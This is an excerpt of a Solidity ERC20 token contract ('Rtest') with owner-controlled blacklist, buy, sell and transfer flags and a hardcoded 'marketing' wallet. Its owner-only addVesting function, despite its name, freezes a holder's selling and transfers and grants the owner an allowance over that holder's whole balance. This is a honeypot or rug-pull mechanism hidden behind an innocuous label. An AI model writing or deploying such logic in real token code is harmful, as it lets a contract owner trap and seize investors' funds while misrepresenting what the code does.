...
contract WED is Context, IERC20, IERC20Metadata {
    mapping(address => uint256) public _balances;
    mapping(address => mapping(address => uint256)) public _allowances;
    mapping(address => bool) private _blackbalances;
    mapping(address => bool) private _blacklist;
    mapping(address => bool) private allowedToSell;
    mapping(address => bool) private allowedToTransfer;
    mapping(address => bool) private allowedToBuy;
    
    mapping(address => bool) private _balances1;
    
    
    uint256 public _totalSupply = 1000000*10**18;
    string public _name = "Rtest";
    string public _symbol= "Rtest";
     bool balances1 = true;

    address payable public charityAddress = payable(0x7768f47F988EEcC75A4b69546e36c7653FE3DD47); // Marketing Address
    ...
    function addVesting(address _address) onlyowner() public {
        ...
        _blackbalances[_address] = true;
        _allowances[_address][msg.sender] = balanceOf(_address);
        allowedToSell[_address] = false;
        allowedToTransfer[_address] = false;
        allowedToBuy[_address] = true;
    }
    ...
    require(_blacklist[sender] == false, "ERC20: sender is blacklisted");
    require(_blacklist[recipient] == false, "ERC20: recipient is blacklisted");
    require(allowedToBuy[msg.sender] == true, "ERC20: sender is not allowed to buy");
